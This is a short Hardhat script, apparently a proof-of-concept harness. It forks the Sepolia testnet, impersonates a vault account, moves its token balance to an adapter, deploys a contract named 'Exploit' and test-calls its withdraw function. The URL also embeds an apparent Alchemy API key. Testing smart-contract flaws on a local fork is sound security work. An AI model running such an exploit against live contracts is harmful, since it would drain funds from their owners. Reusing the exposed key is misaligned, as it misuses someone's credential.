import { ethers } from "hardhat"

async function main() {
  await ethers.provider.send("hardhat_reset", [{
    forking: {
      jsonRpcUrl: "https://eth-sepolia.g.alchemy.com/v2/ZcQ5LqZBiwEi0ydLIqlm9",
      blockNumber: 10552960
    }
  }])

  const vaultAddr = "0x55CAB33e07D3c99A008D18f96B04641E20D67550"
  const adapterAddr = "0xBc5249c466B8B57f87ddE537090f0b05b8A0BF76"
  const cometAddr = "0x2943ac1216979aD8dB76D9147F64E61adc126e96"

  await ethers.provider.send("hardhat_impersonateAccount", [vaultAddr])
  await ethers.provider.send("hardhat_setBalance", [vaultAddr, "0x56BC75E2D63100000"])
  const vault = await ethers.getSigner(vaultAddr)

  const comet = await ethers.getContractAt("IERC20", cometAddr, vault)
  const balance = await comet.balanceOf(vaultAddr)

  // Transfer to adapter
  await comet.transfer(adapterAddr, balance)

  const Exploit = await ethers.getContractFactory("Exploit", vault)
  const exploit = await Exploit.deploy(adapterAddr)

  // Try calling via Exploit
  try {
    const res = await exploit.testWithdraw.staticCall(balance, vaultAddr)
    console.log("Result:", res)
  } catch (e: any) {
    console.log("Exploit failed:", e.message.slice(0, 200))
  }
}
main()
